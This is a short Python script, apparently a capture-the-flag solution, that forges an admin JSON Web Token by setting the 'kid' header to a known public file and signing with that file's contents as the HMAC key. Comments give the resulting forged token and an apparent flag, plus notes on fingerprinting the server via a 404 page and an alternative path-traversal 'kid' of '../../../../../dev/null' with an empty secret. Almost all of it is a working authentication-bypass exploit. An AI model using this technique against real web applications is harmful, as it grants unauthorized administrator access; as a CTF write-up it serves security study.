import base64

header = '{"typ":"JWT","alg":"HS256","kid":"public/css/bootstrap.css"}'
payload = '{"user":"admin"}'

header = base64.encodestring(header).replace("=","").replace("\n","")
payload = base64.encodestring(payload).replace("=","").replace("\n","")

import hmac
import hashlib

data = header + "." + payload
secret = open("bootstrap.css").read()

signature = base64.urlsafe_b64encode(hmac.new(secret, data, digestmod=hashlib.sha256).digest())
token = data + "." + signature
print(token)

# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InB1YmxpYy9jc3MvYm9vdHN0cmFwLmNzcyJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gK2VvpvGOyAvhyUzGwWFBliusBVqm_0mOSew9aO6yCM=
# a91806f7-7bd8-4565-9f0f-0d891c40cc36

# leak a 404 to know what kind of application it is: Sinatra
# inject kid with known file, otherwise bruteforce
# another way is to have kid=../../../../../dev/null and secret=""
